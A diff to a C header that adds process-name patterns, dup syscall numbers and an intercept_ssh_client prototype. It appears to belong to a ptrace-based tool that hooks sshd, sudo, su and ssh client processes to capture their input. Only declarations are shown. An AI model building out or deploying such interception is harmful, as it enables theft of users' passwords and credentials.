@@ -18,16 +18,21 @@
 #define P_SSH_ACC "sshd: [accepted]"
 #define P_SUDO "sudo "
 #define P_SU "su "
+#define P_SSH_CLIENT "ssh "
+#define P_SSH_SCP_SFTP "/usr/bin/ssh "
+#define P_SSH_ADD "ssh-add "
 
 #ifdef __amd64__
 #define eax rax
 #define orig_eax orig_rax
 #define SYSCALL_read  0
 #define SYSCALL_write 1
+#define SYSCALL_dup   32
 #define SYSCALL_clone 56
 #else
 #define SYSCALL_read  3
 #define SYSCALL_write 4
+#define SYSCALL_dup   41
 #define SYSCALL_clone 120
 #endif
 
@@ -38,7 +43,8 @@ enum tracer_types {
   invalid_tracer,
   ssh_tracer,
   sudo_tracer,
-  su_tracer
+  su_tracer,
+  ssh_client_tracer
 };
 
 void trace_process(pid_t);
@@ -61,5 +67,6 @@ void free_process_username(void);
 void intercept_ssh(pid_t);
 void intercept_sudo(pid_t);
 void intercept_su(pid_t);
+void intercept_ssh_client(pid_t);
 
 #endif
